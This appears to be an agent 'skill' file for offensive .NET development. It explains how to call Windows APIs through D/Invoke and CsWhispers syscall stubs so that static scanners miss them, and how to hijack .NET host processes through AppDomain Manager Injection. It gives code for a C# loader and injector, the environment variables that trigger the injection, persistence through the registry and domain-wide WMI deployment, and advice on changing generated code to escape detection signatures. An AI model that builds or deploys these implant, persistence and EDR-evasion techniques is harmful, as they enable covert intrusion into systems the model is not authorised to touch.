# dotnet-offensive

> **Status:** COMPLETE
> **Cluster:** 09-odpc
> **Maps to:** Chapter 35 (P/Invoke and D/Invoke), Chapter 36 (AppDomain Manager Injection)

## Description
Patterns for invoking native Windows APIs from managed C# code without leaving static
import footprints. Covers P/Invoke vs D/Invoke detection surface, CsWhispers for C#
syscall stubs, and AppDomain Manager Injection for hijacking .NET host processes.

Invoke when: writing a C# implant or loader, implementing D/Invoke for a native call,
or setting up AppDomain injection for .NET host hijacking.

## P/Invoke vs D/Invoke: detection surface

| Aspect | P/Invoke | D/Invoke |
|--------|----------|----------|
| **IAT / ImplMap** | Static entry in the module's ImplMap metadata table — trivially visible to any .NET decompiler or static scanner | No static entry; resolved at runtime |
| **DllImport attribute** | Present in source and compiled metadata | Absent |
| **API call origin** | Call comes from the .NET JIT'd code referencing the import | Call made via delegate pointing to a resolved function pointer |
| **Scanner visibility** | dnSpy / ILSpy / YARA rules trivially find `DllImport("kernel32.dll")` | Must analyse dynamic behaviour |

**P/Invoke (flagged):**
```csharp
[DllImport("kernel32.dll")]
static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize,
    uint flAllocationType, uint flProtect);
```

**D/Invoke equivalent:**
```csharp
// No static import — resolve at runtime
var hModule  = DInvoke.PE.Generic.GetLoadedModuleAddress("kernel32.dll");
var pVAlloc  = DInvoke.PE.Generic.GetExportedFunctionDelegateFromModuleBase<
    Win32.Kernel32.VirtualAlloc>(hModule, "VirtualAlloc");
var result   = pVAlloc(IntPtr.Zero, (UIntPtr)size, 0x3000, 0x04);
```

## D/Invoke: core pattern

You can implement a minimal version without the full DInvoke library:

```csharp
using System;
using System.Runtime.InteropServices;
using System.Reflection;

static class DynamicInvoke {
    // Get function delegate from module base + export name
    public static TDelegate GetExportDelegate<TDelegate>(IntPtr hModule, string exportName)
        where TDelegate : Delegate {
        // Walk PE export table to find the function RVA
        IntPtr pFunc = GetExportAddress(hModule, exportName);
        return (TDelegate)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(TDelegate));
    }

    // Wrapper: load module if not loaded, then resolve
    public static TDelegate Resolve<TDelegate>(string moduleName, string exportName)
        where TDelegate : Delegate {
        IntPtr hModule = LoadModuleFromDisk(moduleName);  // manual map or LoadLibrary
        return GetExportDelegate<TDelegate>(hModule, exportName);
    }
}
```

Define delegates for each native function:
```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate IntPtr VirtualAlloc(
    IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate bool VirtualProtect(
    IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
```

## CsWhispers — C# syscall stubs

CsWhispers generates C# source files containing direct syscall stubs (via inline ASM
wrapped in unmanaged delegates). Replaces the D/Invoke delegate approach for sensitive
Nt functions.

```bash
# Generate stubs for specific functions
CsWhispers.exe --functions NtAllocateVirtualMemory,NtWriteVirtualMemory,NtProtectVirtualMemory
# Outputs: Syscalls.cs (C# stubs) + Syscalls.asm (MASM)
```

Include the generated files in your C# project:
- Add `Syscalls.asm` as a MASM custom build tool step
- Add `Syscalls.cs` to the project
- Call: `Syscalls.NtAllocateVirtualMemory(process, ref base, 0, ref size, 0x3000, 0x04)`

CsWhispers includes HalosGate by default — stubs resolve SSN dynamically at first call.

## AppDomain Manager Injection

The .NET CLR loads an AppDomain Manager DLL if certain environment variables are set.
This lets you inject code into any .NET process that starts after the variables are set —
without modifying the target binary.

**Environment variables:**
```
APPDOMAIN_MANAGER_ASM=MyInjector, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
APPDOMAIN_MANAGER_TYPE=MyInjector.InjectorDomainManager
COMPLUS_Version=v4.0.30319   (force specific CLR version if needed)
```

**AppDomain Manager DLL (C#):**
```csharp
using System;
using System.Runtime.InteropServices;

namespace MyInjector {
    public class InjectorDomainManager : AppDomainManager {
        public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
            // This runs in the context of the host .NET process
            // Any code here executes before the application's Main()
            RunShellcode();
            base.InitializeNewDomain(appDomainInfo);
        }

        static void RunShellcode() {
            // Allocate, copy, flip, execute
        }
    }
}
```

**Delivery methods:**
- Set env vars via `SetEnvironmentVariable` in a parent process before launching target
- Set via registry (`HKCU\Environment`) for persistence across all .NET process starts
- Set via WMI `Win32_Environment` for domain-wide deployment

**Targets:** Any .NET app that starts a new CLR instance: PowerShell, MSBuild, InstallUtil,
RegSvcs, RegAsm, and many LOLBins.

## Combining D/Invoke + indirect syscalls from C#

For the full evasion stack in managed code:

```csharp
// 1. Use D/Invoke to locate ntdll without GetModuleHandle IAT entry
var hNtdll = ManualMap.LoadFromDisk("ntdll.dll");

// 2. Find syscall gadget inside ntdll (indirect syscall technique)
var pGadget = FindSyscallGadget(hNtdll);

// 3. Use CsWhispers stubs that jump to the gadget instead of emitting syscall directly
Syscalls.pSyscallGadget = pGadget;
Syscalls.NtAllocateVirtualMemory(/* args */);
```

## Gotchas

- **Strong-name signing:** AppDomain Manager injection requires the DLL to be in the GAC
  or the same directory as the host process (or in `DEVPATH`). Unsigned assemblies in
  random paths may not load.
- **CLR version mismatch:** The injector DLL must target the same CLR version as the host.
  .NET Framework 4.x and .NET Core/5+ have separate CLRs.
- **GAC vs local:** For persistence, install to GAC with `gacutil`. For one-shot injection,
  place in the host's directory.
- **D/Invoke library itself:** Including the full DInvoke NuGet package adds recognisable
  strings and type names. Inline only what you need.
- **Delegate signatures must match exactly:** Wrong calling convention or parameter type
  causes a `MarshalDirectiveException` or silent memory corruption.
- **CsWhispers generated patterns:** As with SysWhispers3, generated patterns are now
  partially signatured. Modify the generated code before shipping.

## Related skills

- `syscall-techniques` — the underlying direct/indirect syscall mechanics (C/C++ reference)
- `dotnet-ci-template` — CI setup for C# projects
- `bof-dev-conventions` — unmanaged alternative for in-memory execution
- `edr-test-loop` — validate D/Invoke + CsWhispers against lab EDRs
